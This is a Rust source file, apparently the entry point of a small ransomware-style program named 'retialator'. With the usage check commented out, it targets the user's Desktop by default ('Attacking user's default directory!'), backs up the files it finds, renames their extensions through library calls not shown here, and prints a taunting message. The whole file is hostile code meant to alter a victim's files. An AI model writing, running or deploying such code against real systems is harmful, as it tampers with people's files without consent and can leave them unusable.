use std::env::args;
use std::process;

use platform_dirs::UserDirs;
use retialator::{change_extension, create_backup, get_files_in_directory};
fn main() {
    let arguments: Vec<String> = args().collect();
    let directory_name: &str;
    let user_directories = UserDirs::new().unwrap();
    if arguments.len() != 2 {
        println!("No Directory Supplied, Attacking user's default directory!");
        directory_name = user_directories
            .desktop_dir
            .to_str()
            .expect("Could not Get User Direcory");
        // eprintln!("Usage : ./{} directory_name", arguments[0]);
        // process::exit(1);
    } else {
        directory_name = arguments[1].as_str();
    }
    println!("{}", directory_name);
    let files = get_files_in_directory(directory_name).unwrap_or_else(|error| {
        eprintln!("{}", error);
        process::exit(1);
    });
    create_backup(&files, directory_name);
    match change_extension(&files, &directory_name) {
        true => {
            println!("YOU DO NOT MESS WITH THE RETIALATOR")
        }
        false => {
            println!("Sadge :(")
        }
    }
    // println!("Hello, world!");
}
